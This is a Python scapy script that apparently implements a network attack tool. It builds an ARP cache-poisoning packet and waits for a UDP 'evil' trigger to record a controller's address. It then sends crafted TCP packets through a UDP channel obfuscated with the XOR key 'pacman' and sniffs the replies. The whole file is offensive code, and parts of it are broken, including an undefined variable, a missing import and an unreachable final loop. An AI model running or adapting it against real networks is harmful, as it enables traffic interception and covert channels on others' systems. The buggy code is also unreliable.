from scapy.all import *
from itertools import cycle

def changeSrcMac(packet):
    if packet.haslayer(Ether):
        packet[Ether].src = Ether().src
        
def changeSrcIp(packet):
    if packet.haslayer(IP):
        packet[IP].src = "10.0.0.2"
        
def changeDstMac(packet):
    global userMAC
    if packet.haslayer(Ether):
        packet[Ether].dst = userMAC
        
def changeDstIp(packet):
    global userIP
    if packet.haslayer(IP):
        packet[IP].dst = userIP
        
def byte_xor(ba1, ba2):
   return bytes([_a ^ _b for _a, _b in zip(ba1, cycle(ba2))])      

def sendTransmitingPacket(packetToTransmit):
    packetData = packetToTransmit
    if packetData.haslayer(Ether):
        packetData[Ether].src = userMAC
        
    bits = byte_xor(bytes(packetData), b'pacman')
    send(IP(dst = userIP)/UDP(sport=1111, dport = 65230)/Raw(load = bits))
    
def retransmitToUser(server_tmp_packet):
    changeDstMac(server_tmp_packet)
    changeDstIp(server_tmp_packet)
    if server_tmp_packet.haslayer(IP):
        del(server_tmp_packet[IP].chksum)
    if server_tmp_packet.haslayer(UDP):
        del(server_tmp_packet[UDP].chksum)
    if server_tmp_packet.haslayer(TCP):
        del(server_tmp_packet[TCP].chksum)
    sendTransmitingPacket(server_tmp_packet)

def attack_tcp(attak_ip, gate_ip, attak_mac):
    packet = Ether(src=userMAC, dst=attak_mac)/ARP(op="is-at", pdst=attak_ip, psrc=gate_ip, hwsrc=userMAC, hwdst=attak_mac)
    return packet
def serverRetransimitUdpPacket(packet):
    if packet.haslayer(Ether):
        if(packet[Ether].src != userMAC):
            return
        if(packet[Ether].src == Ether().src):
            return
    
    if packet.haslayer(UDP): 
        if packet.haslayer(Raw):
            user_packet = packet[Raw].load
            user_packet = byte_xor(bytes(user_packet), b'pacman')
            try:
                scapy_user_packet = Ether(user_packet)
            except struct.error:
                return
            else:
                scapy_user_packet.show()
                SYNACK = sniff_seq_ack(scapy_user_packet)
                if(SYNACK!=0):
                    print(scapy_user_packet[TCP].dport)
                    print(scapy_user_packet[TCP].sport)
                    print(scapy_user_packet[IP].src)
                    print(scapy_user_packet[IP].dst)

                    
                    

def serverRetransmit(packet):
    serverRetransimitUdpPacket(packet)
 
def getUserMacAndIp(packet):
    global userMAC
    global userIP
    if packet.haslayer(UDP): 
        if packet.haslayer(Ether):
            if packet.haslayer(IP):
                if packet.haslayer(Raw):
                    raw = packet[Raw].load
                    print(raw)
                    if(raw== b'evil\n'):
                        userMAC = packet[Ether].src
                        userIP = packet[IP].src
                        print(userIP)
                        print(userMAC)
    

def sniff_seq_ack(packet):
    if packet.haslayer(Ether):
            if packet.haslayer(IP):
                if packet.haslayer(TCP):
                    if packet[IP].dst == serverIP:
                        if scapy_user_packet[IP].src == userIP:
                            
                            return packet
    return 0

userIP = 0
userMAC = 0
SYNACK = 0
serverIP = '192.168.43.166'
print(Ether().src)

while(userIP == 0):
    sniff(prn=getUserMacAndIp, count=1)
    print(userIP)
    print(userMAC)

while(1):
    ip=IP(dst='192.168.43.184')
    SYN=TCP(sport=1030, dport=1111, flags='S', seq=10) 
    packet = ip/SYN
    sendTransmitingPacket(packet)
    sniff(prn=serverRetransmit, count=5)

sniff(prn=serverRetransmit)
